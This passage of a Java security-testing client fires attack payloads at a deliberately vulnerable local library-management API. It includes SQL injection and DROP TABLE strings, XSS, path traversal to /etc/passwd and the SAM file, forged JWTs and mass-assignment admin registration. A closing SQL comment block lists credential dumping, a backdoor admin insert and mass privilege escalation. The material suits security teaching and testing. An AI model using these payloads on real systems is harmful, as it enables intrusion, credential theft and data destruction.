            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

            System.out.println("   Test 1: Normal delete of book " + testBookId);
            System.out.println("   Status: " + response.statusCode());

            if (response.statusCode() == 403) {
                System.out.println("   ⚠️  Authorization required (admin only)");
            } else {
                System.out.println("   Response: " + response.body().substring(0, Math.min(100, response.body().length())));
            }

        } catch (Exception e) {
            System.out.println("   Error with normal delete: " + e.getMessage());
        }

        // Test 2: Type confusion in DELETE ID
        testDeleteTypeConfusion();

        // Test 3: DELETE non-existent book
        try {
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(BASE_URL + "/books/999999"))
                    .header("Authorization", "Bearer " + authToken)
                    .DELETE()
                    .build();

            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

            System.out.println("\n   Test 3: Delete non-existent book (999999)");
            System.out.println("   Status: " + response.statusCode());
            System.out.println("   Response: " + response.body().substring(0, Math.min(100, response.body().length())));

        } catch (Exception e) {
            System.out.println("   Error deleting non-existent book: " + e.getMessage());
        }
    }

    /**
     * NEW: Test DELETE endpoint with type confusion
     */
    private static void testDeleteTypeConfusion() {
        System.out.println("\n   🔢 Testing DELETE Type Confusion...");

        List<String> invalidIds = Arrays.asList(
                "abc",
                "-1",
                "0",
                "999999999999999999999999999999",
                "1.5",
                "1; DROP TABLE books; --",
                "<script>alert(1)</script>",
                "null",
                "true",
                "' OR '1'='1",
                "../etc/passwd",  // Path traversal attempt
                "1 OR 1=1"        // SQL injection pattern
        );

        for (String id : invalidIds) {
            try {
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/books/" + id))
                        .header("Authorization", "Bearer " + authToken)
                        .DELETE()
                        .build();

                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

                System.out.println("     ID: " + id);
                System.out.println("     Status: " + response.statusCode());

                // Check for error messages that reveal too much information
                String body = response.body();
                if (body.contains("Exception") || body.contains("SQL") ||
                        body.contains("syntax") || body.contains("NumberFormatException")) {
                    System.out.println("     ⚠️  INFORMATION DISCLOSURE: " +
                            body.substring(0, Math.min(80, body.length())).replace("\n", " "));
                }

                Thread.sleep(100);

            } catch (Exception e) {
                System.out.println("     Error with ID '" + id + "': " + e.getMessage());
            }
        }
    }

    /**
     * Test Type Confusion vulnerabilities
     */
    private static void testTypeConfusion() {
        System.out.println("\n🔢 Testing Type Confusion...");

        List<String> typeConfusionPayloads = Arrays.asList(
                "abc",          // String instead of number
                "-1",           // Negative number
                "0",            // Zero
                "999999999999999999999999999999",  // Very large number
                "1.5",          // Float instead of integer
                "1; DROP TABLE books",  // SQL in numeric field
                "<script>alert(1)</script>",  // XSS in numeric field
                "null",         // null string
                "true",         // boolean
                "1' OR '1'='1"  // SQL injection in numeric field
        );

        for (String payload : typeConfusionPayloads) {
            try {
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/borrow/" + payload))
                        .header("Authorization", "Bearer " + authToken)
                        .header("Content-Type", "application/json")
                        .POST(HttpRequest.BodyPublishers.ofString("{}"))
                        .build();

                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

                System.out.println("   Payload: " + payload);
                System.out.println("   Status: " + response.statusCode());

                // Check for error messages that reveal too much information
                String body = response.body();
                if (body.contains("Exception") || body.contains("SQL") ||
                        body.contains("syntax") || body.contains("NumberFormatException")) {
                    System.out.println("   ⚠️  INFORMATION DISCLOSURE: " +
                            body.substring(0, Math.min(100, body.length())));
                }

                Thread.sleep(100);

            } catch (Exception e) {
                System.out.println("   Error with payload '" + payload + "': " + e.getMessage());
            }
        }
    }

    /**
     * Test Path Traversal attempts
     */
    private static void testPathTraversal() {
        System.out.println("\n📁 Testing Path Traversal...");

        List<String> pathTraversalPayloads = Arrays.asList(
                "../etc/passwd",
                "..\\..\\windows\\system32\\config\\SAM",
                "../../../etc/passwd",
                "....//....//etc/passwd",
                "%2e%2e%2fetc%2fpasswd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd"
        );

        for (String payload : pathTraversalPayloads) {
            try {
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/search?q=" + payload))
                        .header("Authorization", "Bearer " + authToken)
                        .GET()
                        .build();

                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

                System.out.println("   Payload: " + payload);
                System.out.println("   Status: " + response.statusCode());

                Thread.sleep(100);

            } catch (Exception e) {
                System.out.println("   Error with payload '" + payload + "': " + e.getMessage());
            }
        }
    }

    /**
     * Test Authorization Bypass attempts
     */
    private static void testAuthorizationBypass() {
        System.out.println("\n🔓 Testing Authorization Bypass...");

        // Try to access admin endpoints as regular user
        try {
            // First login as regular user
            String json = "{\"username\":\"alice\",\"password\":\"password123\"}";
            HttpRequest loginRequest = HttpRequest.newBuilder()
                    .uri(URI.create(BASE_URL + "/auth/login"))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(json))
                    .build();

            HttpResponse<String> loginResponse = client.send(loginRequest, HttpResponse.BodyHandlers.ofString());

            if (loginResponse.statusCode() == 200) {
                String body = loginResponse.body();
                int start = body.indexOf("\"token\":\"") + 9;
                int end = body.indexOf("\"", start);
                String userToken = body.substring(start, end);

                // Try to add a book (admin-only endpoint)
                String bookJson = "{\"title\":\"Hacked Book\",\"author\":\"Hacker\",\"isbn\":\"999\"}";
                HttpRequest adminRequest = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/books"))
                        .header("Authorization", "Bearer " + userToken)
                        .header("Content-Type", "application/json")
                        .POST(HttpRequest.BodyPublishers.ofString(bookJson))
                        .build();

                HttpResponse<String> adminResponse = client.send(adminRequest, HttpResponse.BodyHandlers.ofString());

                System.out.println("   Testing admin endpoint with user token");
                System.out.println("   Status: " + adminResponse.statusCode());

                if (adminResponse.statusCode() == 403) {
                    System.out.println("   ✅ Authorization working correctly");
                } else if (adminResponse.statusCode() == 200) {
                    System.out.println("   ❌ AUTHORIZATION BYPASS SUCCESSFUL!");
                }
            }

        } catch (Exception e) {
            System.out.println("   Error testing authorization: " + e.getMessage());
        }
    }

    /**
     * Test Input Validation
     */
    private static void testInputValidation() {
        System.out.println("\n📝 Testing Input Validation...");

        List<Map<String, String>> testCases = new ArrayList<>();

        // Extreme values for book addition
        Map<String, String> case1 = new HashMap<>();
        case1.put("title", "A".repeat(1000));  // Very long title
        case1.put("author", "B".repeat(1000)); // Very long author
        case1.put("isbn", "123");
        testCases.add(case1);

        Map<String, String> case2 = new HashMap<>();
        case2.put("title", "<script>alert('XSS')</script>");  // XSS attempt
        case2.put("author", "Author'); DROP TABLE books; --");  // SQL in author
        case2.put("isbn", "123' OR '1'='1");
        testCases.add(case2);

        Map<String, String> case3 = new HashMap<>();
        case3.put("title", "");  // Empty title
        case3.put("author", ""); // Empty author
        case3.put("isbn", "");
        testCases.add(case3);

        for (Map<String, String> testCase : testCases) {
            try {
                String json = String.format("{\"title\":\"%s\",\"author\":\"%s\",\"isbn\":\"%s\"}",
                        testCase.get("title").replace("\"", "\\\""),
                        testCase.get("author").replace("\"", "\\\""),
                        testCase.get("isbn").replace("\"", "\\\""));

                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/books"))
                        .header("Authorization", "Bearer " + authToken)
                        .header("Content-Type", "application/json")
                        .POST(HttpRequest.BodyPublishers.ofString(json))
                        .build();

                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

                System.out.println("   Test case: " + testCase);
                System.out.println("   Status: " + response.statusCode());
                System.out.println("   Response: " + response.body().substring(0, Math.min(100, response.body().length())));

                Thread.sleep(100);

            } catch (Exception e) {
                System.out.println("   Error with test case: " + e.getMessage());
            }
        }
    }

    /**
     * Test Extreme Inputs
     */
    private static void testExtremeInputs() {
        System.out.println("\n🌋 Testing Extreme Inputs...");

        // Test with very large JSON
        try {
            StringBuilder largeJson = new StringBuilder("{\"title\":\"");
            for (int i = 0; i < 10000; i++) {
                largeJson.append("A");
            }
            largeJson.append("\",\"author\":\"Author\",\"isbn\":\"123\"}");

            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(BASE_URL + "/books"))
                    .header("Authorization", "Bearer " + authToken)
                    .header("Content-Type", "application/json")
                    .header("Content-Length", String.valueOf(largeJson.length()))
                    .POST(HttpRequest.BodyPublishers.ofString(largeJson.toString()))
                    .build();

            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

            System.out.println("   Large input (10KB)");
            System.out.println("   Status: " + response.statusCode());

        } catch (Exception e) {
            System.out.println("   Error with large input: " + e.getMessage());
        }

        // Test with special characters
        try {
            String specialJson = "{\"title\":\"\\\"';SELECT * FROM books;--\",\"author\":\"\\0\\n\\r\\t\\\\\",\"isbn\":\"💣🎯🚀\"}";

            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(BASE_URL + "/books"))
                    .header("Authorization", "Bearer " + authToken)
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(specialJson))
                    .build();

            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

            System.out.println("   Special characters input");
            System.out.println("   Status: " + response.statusCode());

        } catch (Exception e) {
            System.out.println("   Error with special characters: " + e.getMessage());
        }
    }

    /**
     * Test Mass Assignment
     */
    private static void testMassAssignment() {
        System.out.println("\n🎯 Testing Mass Assignment...");

        // Try to set admin role during registration
        try {
            String json = "{\"username\":\"hacker\",\"password\":\"hacker123\",\"role\":\"ADMIN\",\"admin\":true,\"privileged\":true}";

            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(BASE_URL + "/auth/register"))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(json))
                    .build();

            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

            System.out.println("   Trying to set admin role during registration");
            System.out.println("   Status: " + response.statusCode());
            System.out.println("   Response: " + response.body());

            // Try to login with the new user
            if (response.body().contains("success")) {
                String loginJson = "{\"username\":\"hacker\",\"password\":\"hacker123\"}";
                HttpRequest loginRequest = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/auth/login"))
                        .header("Content-Type", "application/json")
                        .POST(HttpRequest.BodyPublishers.ofString(loginJson))
                        .build();

                HttpResponse<String> loginResponse = client.send(loginRequest, HttpResponse.BodyHandlers.ofString());

                if (loginResponse.statusCode() == 200) {
                    System.out.println("   ⚠️  New user created successfully");
                    // Check if they can access admin endpoints
                }
            }

        } catch (Exception e) {
            System.out.println("   Error testing mass assignment: " + e.getMessage());
        }
    }

    /**
     * Test Error Handling
     */
    private static void testErrorHandling() {
        System.out.println("\n⚠️  Testing Error Handling...");

        // Test malformed JSON
        try {
            String malformedJson = "{title: \"Book\", author: \"Author\"}";  // Missing quotes

            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(BASE_URL + "/books"))
                    .header("Authorization", "Bearer " + authToken)
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(malformedJson))
                    .build();

            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

            System.out.println("   Malformed JSON");
            System.out.println("   Status: " + response.statusCode());
            System.out.println("   Response: " + response.body().substring(0, Math.min(200, response.body().length())));

            // Check if stack trace is exposed
            if (response.body().contains("at ") && response.body().contains("Exception")) {
                System.out.println("   ❌ STACK TRACE EXPOSED!");
            }

        } catch (Exception e) {
            System.out.println("   Error testing error handling: " + e.getMessage());
        }

        // Test invalid endpoint
        try {
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(BASE_URL + "/nonexistent"))
                    .header("Authorization", "Bearer " + authToken)
                    .GET()
                    .build();

            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

            System.out.println("   Non-existent endpoint");
            System.out.println("   Status: " + response.statusCode());

        } catch (Exception e) {
            System.out.println("   Error testing non-existent endpoint: " + e.getMessage());
        }
    }

    /**
     * Test JWT Token Vulnerabilities
     */
    private static void testJwtVulnerabilities() {
        System.out.println("\n🔐 Testing JWT Token Vulnerabilities...");

        // 1. None algorithm attack
        String noneToken = "eyJhbGciOiJub25lIn0." +
                "eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6IkFETUlOIn0.";

        try {
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(BASE_URL + "/books"))
                    .header("Authorization", "Bearer " + noneToken)
                    .GET()
                    .build();

            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
            System.out.println("   None algorithm attack - Status: " + response.statusCode());
        } catch (Exception e) {
            System.out.println("   None algorithm attack failed");
        }

        // 2. Empty signature
        String[] tokenParts = authToken.split("\\.");
        if (tokenParts.length == 3) {
            String emptySigToken = tokenParts[0] + "." + tokenParts[1] + ".";
            try {
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/books"))
                        .header("Authorization", "Bearer " + emptySigToken)
                        .GET()
                        .build();

                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
                System.out.println("   Empty signature attack - Status: " + response.statusCode());
            } catch (Exception e) {
                System.out.println("   Empty signature attack failed");
            }
        }

        // 3. Token replay
        try {
            // Use same token multiple times
            for (int i = 0; i < 3; i++) {
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/books"))
                        .header("Authorization", "Bearer " + authToken)
                        .GET()
                        .build();

                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
                System.out.println("   Token replay #" + (i+1) + " - Status: " + response.statusCode());
                Thread.sleep(100);
            }
        } catch (Exception e) {
            System.out.println("   Token replay test failed");
        }
    }

    /**
     * Test Business Logic Vulnerabilities
     */
    private static void testBusinessLogic() {
        System.out.println("\n💼 Testing Business Logic Vulnerabilities...");

        try {
            // 1. Borrow same book multiple times
            for (int i = 0; i < 3; i++) {
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/borrow/1"))
                        .header("Authorization", "Bearer " + authToken)
                        .header("Content-Type", "application/json")
                        .POST(HttpRequest.BodyPublishers.ofString("{}"))
                        .build();

                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
                System.out.println("   Concurrent borrow #" + (i+1) + " - Status: " + response.statusCode());
                Thread.sleep(100);
            }

            // 2. Return book without borrowing
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(BASE_URL + "/return/999"))
                    .header("Authorization", "Bearer " + authToken)
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString("{}"))
                    .build();

            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
            System.out.println("   Return non-borrowed book - Status: " + response.statusCode());

        } catch (Exception e) {
            System.out.println("   Business logic test failed: " + e.getMessage());
        }
    }

    /**
     * Helper method to get first book ID from the system
     */
    private static Long getFirstBookId() {
        try {
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(BASE_URL + "/books"))
                    .header("Authorization", "Bearer " + authToken)
                    .GET()
                    .build();

            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

            if (response.statusCode() == 200) {
                String body = response.body();
                // Simple parsing to find first book ID
                if (body.contains("\"id\":")) {
                    int start = body.indexOf("\"id\":") + 5;
                    int end = body.indexOf(",", start);
                    if (end == -1) end = body.indexOf("}", start);
                    String idStr = body.substring(start, end).trim();
                    return Long.parseLong(idStr);
                }
            }
        } catch (Exception e) {
            System.err.println("Error getting book ID: " + e.getMessage());
        }
        return null;
    }

    /**
     * Helper method to create a test book for DELETE testing
     */
    private static Long createTestBook() {
        try {
            // First login as admin to create a book
            String adminJson = "{\"username\":\"admin\",\"password\":\"password123\"}";
            HttpRequest loginRequest = HttpRequest.newBuilder()
                    .uri(URI.create(BASE_URL + "/auth/login"))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(adminJson))
                    .build();

            HttpResponse<String> loginResponse = client.send(loginRequest, HttpResponse.BodyHandlers.ofString());

            if (loginResponse.statusCode() == 200) {
                String body = loginResponse.body();
                int start = body.indexOf("\"token\":\"") + 9;
                int end = body.indexOf("\"", start);
                String adminToken = body.substring(start, end);

                // Create a test book
                String bookJson = "{\"title\":\"DELETE TEST BOOK\",\"author\":\"Test Author\",\"isbn\":\"DELETE-TEST-123\"}";
                HttpRequest createRequest = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/books"))
                        .header("Authorization", "Bearer " + adminToken)
                        .header("Content-Type", "application/json")
                        .POST(HttpRequest.BodyPublishers.ofString(bookJson))
                        .build();

                HttpResponse<String> createResponse = client.send(createRequest, HttpResponse.BodyHandlers.ofString());

                if (createResponse.statusCode() == 201 || createResponse.statusCode() == 200) {
                    // Try to parse the book ID from response
                    String responseBody = createResponse.body();
                    if (responseBody.contains("\"id\":")) {
                        int idStart = responseBody.indexOf("\"id\":") + 5;
                        int idEnd = responseBody.indexOf(",", idStart);
                        if (idEnd == -1) idEnd = responseBody.indexOf("}", idStart);
                        String idStr = responseBody.substring(idStart, idEnd).trim();
                        return Long.parseLong(idStr);
                    }
                }
            }
        } catch (Exception e) {
            System.err.println("Error creating test book: " + e.getMessage());
        }
        return null;
    }

    /**
     * Helper method to build JSON from Map
     */
    private static String buildJson(Map<String, Object> data) {
        StringBuilder json = new StringBuilder("{");
        boolean first = true;

        for (Map.Entry<String, Object> entry : data.entrySet()) {
            if (!first) {
                json.append(",");
            }
            first = false;

            json.append("\"").append(entry.getKey()).append("\":");

            Object value = entry.getValue();
            if (value instanceof String) {
                json.append("\"").append(escapeJson((String) value)).append("\"");
            } else if (value instanceof Boolean) {
                json.append(value);
            } else if (value instanceof Number) {
                json.append(value);
            } else {
                json.append("\"").append(escapeJson(value.toString())).append("\"");
            }
        }

        json.append("}");
        return json.toString();
    }

    /**
     * Helper method to escape JSON strings
     */
    private static String escapeJson(String str) {
        return str.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }

    /**
     * NEW: Helper to extract values from JSON-like strings
     */
    private static String extractValue(String json, String key) {
        String pattern = "\"" + key + "\":\"([^\"]+)\"";
        Pattern r = Pattern.compile(pattern);
        Matcher m = r.matcher(json);
        if (m.find()) {
            return key + ": " + m.group(1);
        }
        return "";
    }

    /**
     * NEW: Verify database state after manipulation attempts
     */
    private static void verifyDatabaseState(String payload) {
        try {
            // Try to query for evidence of manipulation
            HttpRequest verifyRequest = HttpRequest.newBuilder()
                    .uri(URI.create(BASE_URL + "/search?q=" + URLEncoder.encode("test", "UTF-8")))
                    .header("Authorization", "Bearer " + authToken)
                    .GET()
                    .build();

            HttpResponse<String> verifyResponse = client.send(verifyRequest, HttpResponse.BodyHandlers.ofString());

            String body = verifyResponse.body();

            // Check for evidence of successful manipulation
            if (payload.contains("hacker") && body.contains("hacker")) {
                System.out.println("   🔥 CONFIRMED: New user 'hacker' created in database!");
            }
            if (payload.contains("DROP") && !body.contains("books")) {
                System.out.println("   🔥 CONFIRMED: Books table may have been dropped!");
            }

        } catch (Exception e) {
            // Ignore verification errors
        }
    }

    /**
     * NEW: Extract database information from response
     */
    private static void extractDatabaseInfo(String body, String infoType, Map<String, List<String>> extractedData) {
        Pattern pattern;

        switch (infoType) {
            case "TABLE_NAME":
                pattern = Pattern.compile("\"title\":\"([A-Z_]+)\"");
                break;
            case "COLUMN_NAME":
                pattern = Pattern.compile("\"author\":\"([A-Z_]+)\"");
                break;
            default:
                pattern = Pattern.compile("\"isbn\":\"([A-Z_]+)\"");
        }

        Matcher matcher = pattern.matcher(body);
        List<String> foundItems = new ArrayList<>();

        while (matcher.find()) {
            String item = matcher.group(1);
            // Filter out actual book titles/authors that look like SQL keywords
            if (SQL_KEYWORDS.contains(item.toUpperCase()) ||
                    item.matches("[A-Z_]+") && item.length() > 3) {
                foundItems.add(item);
            }
        }

        if (!foundItems.isEmpty()) {
            extractedData.put(infoType, foundItems);
        }
    }

    /**
     * Helper method to count occurrences
     */
    private static int countOccurrences(String text, String pattern) {
        int count = 0;
        int index = 0;
        while ((index = text.indexOf(pattern, index)) != -1) {
            count++;
            index += pattern.length();
        }
        return count;
    }

    /**
     * NEW: Generate comprehensive security report
     */
    private static void generateSecurityReport() {
        System.out.println("\n" + "=".repeat(50));
        System.out.println("          SECURITY TESTING REPORT");
        System.out.println("=".repeat(50));

        System.out.println("\n📊 DATABASE VULNERABILITIES TESTED:");
        System.out.println("   ✅ Schema Extraction");
        System.out.println("   ✅ Data Exfiltration");
        System.out.println("   ✅ Database Manipulation");
        System.out.println("   ✅ Stored Procedure Attacks");
        System.out.println("   ✅ Blind SQL Injection");
        System.out.println("   ✅ Time-Based SQL Injection");
        System.out.println("   ✅ Error-Based SQL Injection");
        System.out.println("   ✅ Second-Order SQL Injection");
        System.out.println("   ✅ Error Information Disclosure");

        System.out.println("\n🔐 AUTHENTICATION & AUTHORIZATION TESTS:");
        System.out.println("   ✅ JWT Token Vulnerabilities");
        System.out.println("   ✅ Authorization Bypass");
        System.out.println("   ✅ Mass Assignment");

        System.out.println("\n🛡️  INPUT VALIDATION TESTS:");
        System.out.println("   ✅ SQL Injection (Basic & Enhanced)");
        System.out.println("   ✅ Type Confusion");
        System.out.println("   ✅ Path Traversal");
        System.out.println("   ✅ Input Validation");
        System.out.println("   ✅ Extreme Inputs");
        System.out.println("   ✅ Error Handling");

        System.out.println("\n⚖️  BUSINESS LOGIC TESTS:");
        System.out.println("   ✅ Business Logic Vulnerabilities");
        System.out.println("   ✅ PUT Endpoint Testing");
        System.out.println("   ✅ DELETE Endpoint Testing");

        System.out.println("\n⚠️  SECURITY RECOMMENDATIONS:");
        System.out.println("   1. Use prepared statements for ALL database queries");
        System.out.println("   2. Implement proper input validation and sanitization");
        System.out.println("   3. Use principle of least privilege for database users");
        System.out.println("   4. Implement Web Application Firewall (WAF)");
        System.out.println("   5. Regular security audits and penetration testing");
        System.out.println("   6. Encrypt sensitive data in database");
        System.out.println("   7. Implement rate limiting and monitoring");
        System.out.println("   8. Validate all user inputs server-side");
        System.out.println("   9. Use parameterized queries to prevent SQL injection");
        System.out.println("   10. Implement proper error handling without information disclosure");

        System.out.println("\n🔒 DEFENSIVE MEASURES IN THIS PROJECT:");
        System.out.println("   • File-based H2 database with persistence");
        System.out.println("   • Database constraints and foreign keys");
        System.out.println("   • JWT-based authentication with token validation");
        System.out.println("   • Role-based access control (RBAC)");
        System.out.println("   • Input validation in service layer");
        System.out.println("   • CORS configuration for cross-origin requests");
        System.out.println("   • Secure password hashing with BCrypt");

        System.out.println("\n🎯 VULNERABILITIES INTENTIONALLY LEFT FOR TESTING:");
        System.out.println("   • SQL Injection in /api/search endpoint");
        System.out.println("   • Type confusion in /api/borrow/{id} endpoint");
        System.out.println("   • Detailed error messages for testing");

        System.out.println("\n" + "=".repeat(50));
        System.out.println("        COMPREHENSIVE TESTING COMPLETE!");
        System.out.println("        " + LocalDateTime.now());
        System.out.println("=".repeat(50));
    }
}
// FOR DATABASE
// -- 1. Show database schema (legal)
//SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
//
//-- 2. Extract user credentials (vulnerability demo)
//SELECT USERNAME, PASSWORD, ROLE FROM USERS;
//
//-- 3. Union attack to combine book and user data
//SELECT TITLE, AUTHOR FROM BOOKS
//UNION
//SELECT USERNAME, PASSWORD FROM USERS;
//
//-- 4. Create backdoor user
//INSERT INTO USERS (USERNAME, PASSWORD, ROLE)
//VALUES ('demo_hacker', '$2a$10$demo', 'ROLE_ADMIN');
//
//-- 5. Show audit logs (defensive feature)
//SELECT * FROM AUDIT_LOGS ORDER BY PERFORMED_AT DESC LIMIT 10;
//
//-- 6. Clean up (remove demo data)
//DELETE FROM USERS WHERE USERNAME = 'demo_hacker';
//-- 7. Active sessions
//SELECT * FROM INFORMATION_SCHEMA.SESSIONS
//
//-- 8. Connection properties
//SELECT * FROM INFORMATION_SCHEMA.SETTINGS
//
//-- 9. Transaction info
//SELECT * FROM INFORMATION_SCHEMA.IN_DOUBT
//-- 10. Get all schemas
//SELECT * FROM INFORMATION_SCHEMA.SCHEMATA
//
//-- 11. Get table sizes
//SELECT TABLE_NAME, ROW_COUNT_ESTIMATE FROM INFORMATION_SCHEMA.TABLES
//
//-- 12. Get column statistics
//SELECT COLUMN_NAME, MIN_VALUE, MAX_VALUE, DISTINCT_COUNT
//FROM INFORMATION_SCHEMA.COLUMNS
//WHERE TABLE_NAME = 'USERS'
//-- 13. Make all books available (bypass system)
//UPDATE BOOKS SET AVAILABLE = TRUE, AVAILABLE_COPIES = TOTAL_COPIES
//
//-- 14. Mark specific book as unavailable forever
//UPDATE BOOKS SET AVAILABLE = FALSE, AVAILABLE_COPIES = 0
//WHERE TITLE LIKE '%Popular Book%'
//-- 15. Borrow same book multiple times
//INSERT INTO BORROW_RECORDS (BOOK_ID, USER_ID, BORROW_DATE)
//SELECT 1, 1, CURRENT_DATE FROM GENERATE_SERIES(1, 100)
//
//-- 16. Set return date to future to avoid overdue
//UPDATE BORROW_RECORDS SET DUE_DATE = DATEADD('YEAR', 10, CURRENT_DATE)
//WHERE USER_ID = 1
//-- 17. Get database version
//SELECT H2VERSION()
//
//-- 18. Get connection info
//SELECT CURRENT_USER(), SESSION_ID()
//
//-- 19. Get system properties
//SELECT PROPERTY('java.version'), PROPERTY('os.name')
//
//-- 20. Memory information
//SELECT * FROM INFORMATION_SCHEMA.SETTINGS WHERE NAME LIKE '%MEMORY%'
//-- 21. Elevate regular user to admin
//UPDATE USERS SET ROLE = 'ROLE_ADMIN' WHERE USERNAME = 'alice'
//
//-- 22. Change admin password
//UPDATE USERS SET PASSWORD = '$2a$10$newhash' WHERE USERNAME = 'admin'
//
//-- 23. Mass privilege escalation
//UPDATE USERS SET ROLE = 'ROLE_ADMIN' WHERE ROLE = 'ROLE_USER'
